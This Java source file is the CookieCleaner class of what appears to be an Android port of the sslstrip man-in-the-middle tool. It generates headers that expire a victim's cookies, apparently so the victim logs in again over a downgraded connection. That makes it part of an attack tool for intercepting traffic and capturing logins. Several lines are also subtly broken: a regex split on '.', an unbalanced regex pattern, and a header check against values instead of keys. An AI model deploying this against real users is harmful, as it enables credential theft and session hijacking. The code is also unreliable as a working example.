package com.crazyricky.androidsslstrip.sslstrip;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Properties;

public class CookieCleaner {
    private static CookieCleaner sCookieCleaner;
    HashSet<ClientDomain> mCleanedCookies;
    boolean mEnabled = false;

    // TODO : thread safe
    public static CookieCleaner getInstance() {
        if (sCookieCleaner == null) {
            sCookieCleaner = new CookieCleaner();
        }
        return sCookieCleaner;
    }

    private CookieCleaner() {
        mCleanedCookies = new HashSet<ClientDomain>();
        mEnabled = false;
    }

    public void setEnabled(boolean enabled) {
        mEnabled = enabled;
    }

    public boolean isClean(String method, String client, String host, Properties headers) {
        if (method.equals("POST")) {
            return true;
        }

        if (!mEnabled) {
            return true;
        }

        if (!hasCookies(headers)) {
            return true;
        }
        return mCleanedCookies.contains(new ClientDomain(client,
                getDomainFor(host)));
    }

    public ArrayList<String> getExpireHeaders(String method, String client, String host, Properties headers, String path) {
        String domain = getDomainFor(host);
        mCleanedCookies.add(new ClientDomain(client, domain));

        ArrayList<String> expireHeaders = new ArrayList<String>();

        String cookies = headers.getProperty("cookie", "");
        String cookieArray[] = cookies.split(";");
        for (String cookie : cookieArray) {
            cookie = cookie.split("=")[0].replaceAll("( |\n)$)|^( |\n)", "");
            ArrayList<String> expireHeadersForCookie = getExpireCookieStringFor(
                    cookie, host, domain, path);
            expireHeaders.addAll(expireHeadersForCookie);
        }
        return expireHeaders;
    }

    public boolean hasCookies(Properties headers) {
        return headers.contains("cookie");
    }

    public String getDomainFor(String host) {
        String[] hostParts = host.split(".");
        return "." + hostParts[hostParts.length - 2] + "."
                + hostParts[hostParts.length - 1];
    }

    public ArrayList<String> getExpireCookieStringFor(String cookie,
            String host, String domain, String path) {
        String[] pathList = path.split("/");
        ArrayList<String> expireStrings = new ArrayList<String>();

        expireStrings.add(cookie + "=" + "EXPIRED;Path=/;Domain=" + domain
                + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n");

        expireStrings.add(cookie + "=" + "EXPIRED;Path=/;Domain=" + host
                + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n");

        if (pathList.length > 2) {
            expireStrings.add(cookie + "=" + "EXPIRED;Path=/" + pathList[1]
                    + ";Domain=" + domain
                    + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n");

            expireStrings.add(cookie + "=" + "EXPIRED;Path=/" + pathList[1]
                    + ";Domain=" + host
                    + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n");
        }
        return expireStrings;
    }

    private static class ClientDomain {
        String mClient;
        String mDomain;

        ClientDomain(String client, String domain) {
            mClient = client;
            mDomain = domain;
        }

        @Override
        public int hashCode() {
            return (mClient + mDomain).hashCode();
        }

        @Override
        public boolean equals(Object other) {
            return hashCode() == ((ClientDomain) other).hashCode();
        }
    }
}
